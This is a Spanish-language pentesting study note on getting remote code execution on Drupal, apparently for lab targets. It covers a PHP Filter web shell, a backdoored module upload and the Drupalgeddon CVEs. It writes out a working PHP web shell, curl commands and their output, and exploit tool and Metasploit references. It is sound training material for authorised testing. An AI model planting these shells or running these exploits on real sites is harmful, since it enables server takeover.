---
tags:
  - Web/Red-Team
  - Drupal
  - Pentesting/Explotacion
Fecha de actualización: 2026-07-16
Nota previa: "[[00 - Descubrimiento y enumeración de Drupal]]"
Nota siguiente: "[[00 - Descubrimiento y enumeración de Tomcat]]"
Area: "[[Common Applications.base|Common Applications]]"
---
---

Conseguir shell en Drupal no es tan directo como editar un tema PHP (como en [[01 - Ataques a WordPress|WordPress]]). Hay tres vías: abusar del **PHP Filter**, subir un **módulo con backdoor**, o explotar una **CVE de core (Drupalgeddon)**.

# Abusar del módulo PHP Filter

En Drupal **< 8**, con acceso admin se activa el módulo *PHP filter* (permite evaluar PHP embebido), se crea una página básica con un web shell y se pone el *Text format* en `PHP code`:

```php
<?php system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); ?>
```

<mark style="background: #FFB86CA6;">Nombrar el parámetro con un hash MD5 (no `cmd`) evita dejar un web shell "drive-by"</mark> que otro atacante encuentre por fuerza bruta. La página queda en `/node/N`; se ejecuta con `?<md5>=id`:

```shell-session
$ curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

En Drupal **8+** el PHP Filter no viene instalado; habría que instalarlo (con permiso del cliente). Limpiar siempre: desactivar el módulo y borrar las páginas creadas.

# Módulo con backdoor

Drupal permite subir módulos. Se coge uno legítimo (p. ej. `CAPTCHA`), se le añaden un `shell.php` y un `.htaccess` (necesario porque Drupal deniega el acceso directo a `/modules`), se reempaqueta y se instala vía **Extend → Install new module**:

```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```

Luego se ejecuta en `/modules/captcha/shell.php?<md5>=id`.

# Drupalgeddon: las CVEs de core

> [!important]+ Las tres Drupalgeddon
> <mark style="background: #FF5582A6;">Las RCE históricas de Drupal, aún muy explotadas en instancias sin parchear</mark>:
> - **CVE-2014-3704 (Drupalgeddon)** — SQLi **pre-auth** (7.0–7.31) → crear usuario admin. `drupalgeddon.py -t URL -u hacker -p pwnd`, luego activar PHP Filter. También `exploit/multi/http/drupal_drupageddon` (Metasploit).
> - **CVE-2018-7600 (Drupalgeddon2)** — RCE **pre-auth** (< 7.58 y < 8.5.1) por sanitización insuficiente en el registro. PoC [`a2u/CVE-2018-7600`](https://github.com/a2u/CVE-2018-7600) → subir un PHP shell (payload en base64).
> - **CVE-2018-7602 (Drupalgeddon3)** — RCE **autenticada** (requiere permiso de borrar nodos). `exploit/multi/http/drupal_drupageddon3` con la cookie de sesión.

```shell-session
# Drupalgeddon2: subir web shell y ejecutar
$ python3 drupalgeddon2.py      # → http://target/mrb3n.php
$ curl http://drupal-dev.inlanefreight.local/mrb3n.php?<md5>=id
uid=33(www-data) gid=33(www-data)
```

> [!info]+ Modernización
> **Drupalgeddon2 (CVE-2018-7600) sigue en el top de exploits lanzados** contra Drupal expuesto. Añadir a la lista **CVE-2019-6340** (RCE vía REST en 8.x). Y un dato clave para 2026: <mark style="background: #FFB8EBA6;">Drupal 7 llegó a *End-of-Life* en enero de 2025</mark> — hay una enorme base instalada de 7.x que ya no recibe parches, terreno fértil para Drupalgeddon. Herramientas: `nuclei -tags drupal`, los módulos de Metasploit y [`droopescan`](https://github.com/SamJoan/droopescan) para el fingerprint previo.

Siguiente aplicación, el servidor de aplicaciones Java por excelencia: [[00 - Descubrimiento y enumeración de Tomcat|Tomcat]].
